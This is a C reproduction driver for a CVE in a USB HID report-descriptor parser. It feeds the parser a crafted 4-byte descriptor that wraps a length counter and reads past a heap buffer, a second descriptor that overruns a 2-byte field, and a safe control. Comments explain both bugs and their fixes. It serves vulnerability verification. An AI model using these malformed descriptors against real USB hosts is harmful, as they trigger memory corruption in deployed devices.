/* Local reproduction driver for CVE-2026-61497. Includes parser.inc, which
 * run-all.sh slices verbatim from the pinned src/class/hid/hid_host.c.
 * No socket, no USB hardware, no upstream source modification. */
#include "shim.h"

#include "parser.inc"

/* Researcher PoC (gist 8fe6e5881614a7f86b5d2b87d44ea706, bug3_final.c):
 * 05 01 (USAGE_PAGE, 1 data byte), 07 (size=3 => 4 bytes) with only DE left.
 * Vulnerable: 1-4 wraps uint16_t desc_len to 0xFFFD and the loop walks past
 * the heap buffer. Fixed: "if (size > desc_len) break;" stops at 0 reports. */
static const uint8_t attack_desc[4] = { 0x05, 0x01, 0x07, 0xDE };

/* Second fix hunk: 4-byte USAGE_PAGE item copied into a 2-byte usage_page
 * field. Vulnerable memcpy overruns the field; fixed TU_MIN bounds it. */
static const uint8_t width_desc[5] = { 0x07, 0xDE, 0xAD, 0xBE, 0xEF };

/* Well-formed report descriptor: every item fits in the remaining length. */
static const uint8_t safe_desc[13] = {
  0x05, 0x01, 0x09, 0x02, 0xA1, 0x01, 0x75, 0x08,
  0x95, 0x03, 0x81, 0x02, 0xC0
};

int main(int argc, char **argv)
{
  setbuf(stdout, NULL);
  const char *which = argc > 1 ? argv[1] : "attack";
  const uint8_t *src;
  size_t len;

  if (!strcmp(which, "width")) {
    src = width_desc; len = sizeof(width_desc);
  } else if (!strcmp(which, "safe")) {
    src = safe_desc; len = sizeof(safe_desc);
  } else {
    src = attack_desc; len = sizeof(attack_desc);
  }

  /* Exact-size heap allocation: ASan reports any read past the descriptor. */
  uint8_t *desc = (uint8_t *) malloc(len);
  if (!desc) return 2;
  memcpy(desc, src, len);

  tuh_hid_report_info_t info[1];
  uint8_t reports = tuh_hid_parse_report_descriptor(info, 1, desc, (uint16_t) len);
  printf("input=%s bytes=%zu report_num=%u usage_page=%u\n",
         which, len, reports, (unsigned) info[0].usage_page);
  free(desc);
  return 0;
}
